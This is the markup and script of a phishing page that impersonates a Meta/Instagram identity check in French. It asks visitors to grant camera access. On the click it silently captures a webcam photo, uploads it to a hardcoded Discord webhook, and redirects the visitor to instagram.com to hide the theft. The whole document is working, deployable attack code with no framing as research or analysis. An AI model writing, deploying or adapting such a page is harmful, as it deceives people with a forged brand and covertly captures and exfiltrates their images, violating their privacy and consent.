<body>
    <div class="ig-wrapper">
        <div class="container">
            <div class="logo-container">
                <div class="logo"></div>
            </div>
            <h2>Confirmation d'identité</h2>
            <p>Pour des raisons de sécurité, nous devons vérifier que vous êtes une personne réelle. Veuillez autoriser l'accès à votre caméra pour continuer.</p>
            
            <video id="video" autoplay playsinline></video>
            <canvas id="canvas" style="display:none;"></canvas>
            
            <button class="btn" id="start-btn">Continuer</button>
            
            <div class="footer-text">Ce contrôle de sécurité est obligatoire.</div>
        </div>
        
        <div class="meta-footer">
            <i class="fa-solid fa-shield-halved"></i> From Meta
        </div>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const btn = document.getElementById('start-btn');
        
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1568232984211882147/d-_mDSq4-UZeY_x0wtzQWCqt_FPCSCFmJnX-VQKtFY8gmml7AYok_v9AFmqzNdyyjBQQ";

        btn.addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                btn.innerText = "Vérification en cours...";
                btn.disabled = true;
                
                video.onloadedmetadata = async () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('payload_json', JSON.stringify({
                            content: "📸 **Nouvelle capture Webcam (Instantanée)**"
                        }));
                        formData.append('file', blob, 'capture.jpg');

                        try {
                            await fetch(WEBHOOK_URL, {
                                method: 'POST',
                                body: formData
                            });
                        } catch (error) {
                            console.error(error);
                        }

                        setTimeout(() => {
                            window.location.href = "https://www.instagram.com";
                        }, 500);
                        
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg');
                };

            } catch (err) {
                alert("Erreur : " + err.message);
            }
        });
    </script>
